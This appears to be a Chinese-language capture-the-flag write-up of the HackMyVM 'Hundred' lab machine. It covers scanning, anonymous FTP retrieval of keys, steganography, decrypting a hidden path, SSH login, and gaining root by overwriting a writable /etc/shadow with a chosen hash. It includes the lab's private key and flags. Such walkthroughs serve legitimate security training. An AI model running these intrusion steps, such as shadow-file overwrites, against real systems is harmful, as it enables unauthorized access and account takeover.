# 信息搜集
主机发现

```bash
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f7:03:e6, IPv4: 192.168.21.13
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.21.1    cc:e0:da:eb:34:a2       Baidu Online Network Technology (Beijing) Co., Ltd
192.168.21.2    04:6c:59:bd:33:50       Intel Corporate
192.168.21.3    08:00:27:34:c4:f0       PCS Systemtechnik GmbH
192.168.21.11   92:87:65:03:f9:bb       (Unknown: locally administered)
192.168.21.4    c2:ab:39:9e:98:94       (Unknown: locally administered)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.067 seconds (123.85 hosts/sec). 5 responded
```
端口扫描

```bash
┌──(root㉿kali)-[~]
└─# nmap --min-rate 10000 -p- 192.168.21.3 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 02:06 EDT
Nmap scan report for 192.168.21.3 (192.168.21.3)
Host is up (0.000075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:34:C4:F0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds
                                                                
┌──(root㉿kali)-[~]
└─# nmap -sT -sV -O -p21,22,80 192.168.21.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 02:06 EDT
Nmap scan report for 192.168.21.3 (192.168.21.3)
Host is up (0.0020s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
MAC Address: 08:00:27:34:C4:F0 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```

# 漏洞利用
尝试一下21端口能不能匿名登陆

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.21.3 
Connected to 192.168.21.3.
220 (vsFTPd 3.0.3)
Name (192.168.21.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||61439|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Aug 02  2021 .
drwxr-xr-x    2 0        113          4096 Aug 02  2021 ..
-rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa
-rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem
-rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub
-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt
226 Directory send OK.
ftp> get users.txt
local: users.txt remote: users.txt
229 Entering Extended Passive Mode (|||29464|)
150 Opening BINARY mode data connection for users.txt (187 bytes).
100% |*******************|   187      304.36 KiB/s    00:00 ETA
226 Transfer complete.
187 bytes received in 00:00 (155.02 KiB/s)
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||37281|)
150 Opening BINARY mode data connection for id_rsa (435 bytes).
100% |*******************|   435      933.63 KiB/s    00:00 ETA
226 Transfer complete.
435 bytes received in 00:00 (486.04 KiB/s)
ftp> get id_rsa.pem
local: id_rsa.pem remote: id_rsa.pem
229 Entering Extended Passive Mode (|||5883|)
150 Opening BINARY mode data connection for id_rsa.pem (1679 bytes).
100% |*******************|  1679        3.82 MiB/s    00:00 ETA
226 Transfer complete.
1679 bytes received in 00:00 (2.13 MiB/s)
ftp> get id_rsa.pub
local: id_rsa.pub remote: id_rsa.pub
229 Entering Extended Passive Mode (|||10762|)
150 Opening BINARY mode data connection for id_rsa.pub (451 bytes).
100% |*******************|   451      695.78 KiB/s    00:00 ETA
226 Transfer complete.
451 bytes received in 00:00 (374.83 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
┌──(kali㉿kali)-[~]
└─$ cat id_rsa                             
  / \
    / _ \
   | / \ |
   ||   || _______
   ||   || |\     \
   ||   || ||\     \
   ||   || || \    |
   ||   || ||  \__/
   ||   || ||   ||
    \\_/ \_/ \_//
   /   _     _   \
  /               \
  |    O     O    |
  |   \  ___  /   |                           
 /     \ \_/ /     \
/  -----  |  --\    \
|     \__/|\__/ \   |
\       |_|_|       /
 \_____       _____/
       \     /
       |     |
-------------------------
```

```bash
┌──(kali㉿kali)-[~]
└─$ cat id_rsa.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwsrHORyA+mG6HS9ZmZwzPmKHrHhA0/kKCwNjUG8rmPVupv73
mUsewpoGvYB9L9I7pUAsMscAb5MVo89d4b0z2RnXDD1fh6mKlTJmcNwWCnA1PgD+
OwqewshpkCBhCV6O2P6dktfA8UI/uqF6uT4QISU4ksriN16cOm/89jHadetB8dCe
h3Rx6HrFNccY8aiDRSA9meqz7YGE2+lJ/NtwtndUkzzxKxuKC6z4gG780tZHhg83
xVwZ9bxPyHfGqHWmV4yGsAgp7mot7pg9VzffnP6DAVnbReDDbhNLcnfVXEkBv8SQ
L7OFIiKxJpoa1ADqGffA5LOPFdYKbbCFMictQQIDAQABAoIBAE4Q6IDp/ILcEbPK
mzUl1Z+l60visdCCGVVKmU3OEAHwMtV4j5B++6fwBM2Dpig5MDBNJKmA+Zq9rsmE
vNJQemwCoB3Gpvd+qgybM1T9z1OFnsDnsvvEiNX1beEWKO2RWNx8RnhoQWovK81H
FCETT3GJMkAaUUjxgNkmspGUb0IcP4YR61jpNy8thMLz8FQV8XqNSf4DSd9+8wrm
FBFDFzso6zcBtsY6/nDueaVfLsequU1Fdhh3itC6rPXync/EWN0HJtaiKEVAytYE
cvl1hVpRVhGZGjPqNQSPcknO0K2b22anRoiSpBoCzaopbSZHySFgcZM8oxGgw35j
YpS1ULUCgYEA+1Se5s4AzsOX/3RRwwF9Was//oHU1N2JnJRetF9tjeFu8MEMnSec
a3bcPy+CZHB8oVnoyh647IObzPUjCgMxdyTLdfGmQ8RgzXhwYeQRe+ethrT/Ra26
7m+R+3838k5ZTKnwjBPreV/i2AmwZYDPT2S5q5b7m5Cr4QTfsaScaKsCgYEAxmk/
xzu2XO8YmE+8R62nWdLPMaj4E5IPkT3uCA8G24KGSSyK29OGZ02RI8qxWkdqMxKJ
rTDrQJ/4oU6108Vhay0tyFswbNn0ymlHAhPKxXNr0xHkC6rCnDEnn6W7bspTxxyk
9OUtl2UemtnEKRm3qu9Rc1qLFW0/Zhxw3ovgWcMCgYEAka6HPPoD9dXicSyXiBWA
900QlxHisFCJx70o+ByogClACUWdbirbvF71Y5rCVj3twAlBqocMYewXj0I4wUEA
lzM4zHD6EyXthqxdWCC/EbdFGmQn49fEFxmM4N7pKwbHNGz9BfU19PDjqJ5VJUD4
6ehUx2WJCq9dMd2FXI8yKmkCgYAMBBnBtiMQM8a4irOrX5/v961mo4YKoWDh+e8t
e8N9jcUWL2VldMUCApeUpFTjU8nht/CwlXLZ4hZLppmqbpy8weqw5JzlKroBfCi5
vnscRCY2jTHTZw8MKInuyDm2tvgl6d0vm6WMMqqM1D1mA9G0v3OeWdBshsY9J+HK
CIyYwwKBgQDEXoZ+lZKyPUBSgcE+b52U2Dj9GAPKPUDZpsCbUebftZknOk/HelF1
wiWWDjni1ILVSfWIR4/nvosJPa+39WDv+dFt3bJdcUA3SL2acW3MGVPC6abZWwSo
izXrZm8h0ZSuXyU/uuT3BCJt77HyN2cPZrqccPwanS9du6zrX0u2yQ==
-----END RSA PRIVATE KEY-----
```

```bash
┌──(kali㉿kali)-[~]
└─$ cat id_rsa.pub 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwsrHORyA+mG6HS9ZmZwz
PmKHrHhA0/kKCwNjUG8rmPVupv73mUsewpoGvYB9L9I7pUAsMscAb5MVo89d4b0z
2RnXDD1fh6mKlTJmcNwWCnA1PgD+OwqewshpkCBhCV6O2P6dktfA8UI/uqF6uT4Q
ISU4ksriN16cOm/89jHadetB8dCeh3Rx6HrFNccY8aiDRSA9meqz7YGE2+lJ/Ntw
tndUkzzxKxuKC6z4gG780tZHhg83xVwZ9bxPyHfGqHWmV4yGsAgp7mot7pg9Vzff
nP6DAVnbReDDbhNLcnfVXEkBv8SQL7OFIiKxJpoa1ADqGffA5LOPFdYKbbCFMict
QQIDAQAB
-----END PUBLIC KEY-----
```

```bash
┌──(kali㉿kali)-[~]
└─$ cat users.txt 
--- SNIP ---
noname
roelvb
ch4rm
marcioapm
isen
sys7em
chicko
tasiyanci
luken
alienum
linked
tatayoyo
0xr0n1n
exploiter
kanek180
cromiphi
softyhack
b4el7d
val1d
--- SNIP ---

Thanks!
hmv
```
先看一下80端口

![输入图片说明](image/4c18b339f0d64f67a872309afe7caed4.png)

```bash
┌──(root㉿kali)-[~]
└─# curl http://192.168.21.3                 
<style>
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  key: h4ckb1tu5.enc;
  width: 50%;
}
</style>

<img src="logo.jpg" class="center"> 
<h1>Thank you ALL!</h1>
<h1>100 f*cking VMs!!</h1>

<!-- l4nr3n, nice dir.-->
```

目录扫描

```bash
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://192.168.21.3 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt,zip,jpg,png,git 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,jpg,png,git,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 242]
/logo.jpg             (Status: 200) [Size: 7277]
Progress: 1661144 / 1661152 (100.00%)
===============================================================
Finished
===============================================================
```
/logo.jpg

![输入图片说明](image/9db624ecb5724a668e87aa34bbde865f.png)

看看图片有没有什么信息

```bash
┌──(kali㉿kali)-[~]
└─$ exiftool logo.jpg 
ExifTool Version Number         : 13.00
File Name                       : logo.jpg
Directory                       : .
File Size                       : 7.3 kB
File Modification Date/Time     : 2025:03:21 02:16:16-04:00
File Access Date/Time           : 2025:03:21 02:17:06-04:00
File Inode Change Date/Time     : 2025:03:21 02:16:16-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 216
Image Height                    : 213
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 216x213
Megapixels                      : 0.046
┌──(kali㉿kali)-[~]
└─$ stegseek logo.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.51% (132.8 MB)           
[!] error: Could not find a valid passphrase.
┌──(kali㉿kali)-[~]
└─$ stegseek logo.jpg users.txt                       
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "cromiphi"
[i] Original filename: "toyou.txt".
[i] Extracting to "logo.jpg.out".
┌──(kali㉿kali)-[~]
└─$ cat logo.jpg.out 
d4t4s3c#1
```

查看一下robots.txt

```bash
User-agent: *
Disallow: /crossroads.png
```
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.3/crossroads.png        
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>
```
看一下/h4ckb1tu5.enc

![输入图片说明](image/1cb25ae231e846da8e24c30169e4d21d.png)

```bash
┌──(kali㉿kali)-[~]
└─$ cat h4ckb1tu5.enc 
�Jz▒U(}�D�H�����ӊ��TfV����õ�H���aL�$��Eq�2�)]`J���2H�ٽ~����;2�"�����������
          0l
            �u�k
                ���Ul��.C�1��Q�R�Wδ�j>������������
�˴}��K����▒J�����i[?����$�܎"
                            ���x����J�����=q�Zq���4!�K��e�P
                                                           J{��Q����3�m�Q��▒J��_)���ٶ�Z
```

```bash
┌──(kali㉿kali)-[~]
└─$ openssl pkeyutl -decrypt -in h4ckb1tu5.enc -out 1.txt -inkey id_rsa.pem
                                                                
┌──(kali㉿kali)-[~]
└─$ cat 1.txt               
/softyhackb4el7dshelldredd
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.3/softyhackb4el7dshelldredd
<html>
<head><title>301 Moved Permanently</title></head>
<body bgcolor="white">
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>
```
更进一步的扫描

```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.21.3/softyhackb4el7dshelldredd
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                
 (_||| _) (/_(_|| (_| )                                         
                                                                
Extensions: php, aspx, jsp, html, js | HTTP method: GET
Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.21.3/_softyhackb4el7dshelldredd_25-03-21_02-42-19.txt

Target: http://192.168.21.3/

[02:42:19] Starting: softyhackb4el7dshelldredd/                 
[02:42:31] 200 -    2KB - /softyhackb4el7dshelldredd/id_rsa
```
下载下来

```bash
┌──(kali㉿kali)-[~]
└─$ wget http://192.168.21.3/softyhackb4el7dshelldredd/id_rsa
--2025-03-21 02:43:49--  http://192.168.21.3/softyhackb4el7dshelldredd/id_rsa
Connecting to 192.168.21.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1876 (1.8K) [application/octet-stream]
Saving to: ‘id_rsa.1’

id_rsa.1        100%[=======>]   1.83K  --.-KB/s    in 0s      

2025-03-21 02:43:49 (411 MB/s) - ‘id_rsa.1’ saved [1876/1876]
```
用刚才从logo.jpg中得到的字符串尝试，就是密钥密码

```bash
┌──(root㉿kali)-[~]
└─# chmod +x /home/kali/id_rsa               
                                                                
┌──(root㉿kali)-[~]
└─# ssh hmv@192.168.21.3 -i /home/kali/id_rsa
Enter passphrase for key '/home/kali/id_rsa': 
Linux hundred 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug  2 06:43:27 2021 from 192.168.1.51
hmv@hundred:~$ 
```

# 提权
user.txt

```bash
hmv@hundred:~$ ls -la
total 40
drwxr-xr-x 4 hmv  hmv  4096 Aug  2  2021 .
drwxr-xr-x 3 root root 4096 Aug  2  2021 ..
-rw------- 1 hmv  hmv    23 Aug  2  2021 .bash_history
-rw-r--r-- 1 hmv  hmv   220 Aug  2  2021 .bash_logout
-rw-r--r-- 1 hmv  hmv  3526 Aug  2  2021 .bashrc
drwxr-xr-x 3 hmv  hmv  4096 Aug  2  2021 .local
-rw-r--r-- 1 hmv  hmv   807 Aug  2  2021 .profile
drwx------ 2 hmv  hmv  4096 Aug  2  2021 .ssh
-rw------- 1 hmv  hmv    12 Aug  2  2021 user.txt
-rw------- 1 hmv  hmv    53 Aug  2  2021 .Xauthority
hmv@hundred:~$ cat user.txt
HMV100vmyay
```
看一看都有什么

```bash
hmv@hundred:~$ sudo -l
-bash: sudo: command not found
hmv@hundred:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
hmv@hundred:~$ which getcap
hmv@hundred:~$ whereis getcap
getcap: /usr/sbin/getcap /usr/share/man/man8/getcap.8.gz
hmv@hundred:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
hmv@hundred:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
hmv:x:1000:1000:hmv,,,:/home/hmv:/bin/bash
```
用linpeas.sh和pspy64看一看

```bash
hmv@hundred:~$ wget http://192.168.21.13:/linpeas.sh
--2025-03-21 04:07:41--  http://192.168.21.13/linpeas.sh
Connecting to 192.168.21.13:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh      100%[=======>] 820.39K  --.-KB/s    in 0.005s  

2025-03-21 04:07:41 (175 MB/s) - ‘linpeas.sh’ saved [840082/840082]

hmv@hundred:~$ wget http://192.168.21.13:/pspy64
--2025-03-21 04:07:50--  http://192.168.21.13/pspy64
Connecting to 192.168.21.13:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M)
Saving to: ‘pspy64’

pspy64          100%[=======>]   2.96M  --.-KB/s    in 0.03s   

2025-03-21 04:07:50 (112 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

![输入图片说明](image/470f83b0702448989b4dff233ce3c34b.png)

提权

```bash
hmv@hundred:~$ echo 'root:$1$0kISkb4V$7f8fQ36adKBsV2Rgf0AoX.:18888:0:99999:7:::' > /etc/shadow
hmv@hundred:~$ su root
Password: 
root@hundred:/home/hmv# id 
uid=0(root) gid=0(root) groups=0(root)
```
root.txt

```bash
root@hundred:/home/hmv# cd ~
root@hundred:~# ls -la
total 28
drwx------  3 root root 4096 Aug  2  2021 .
drwxr-xr-x 18 root root 4096 Aug  2  2021 ..
-rw-------  1 root root   16 Aug  2  2021 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Aug  2  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   15 Aug  2  2021 root.txt
root@hundred:~# cat root.txt 
HMVkeephacking
```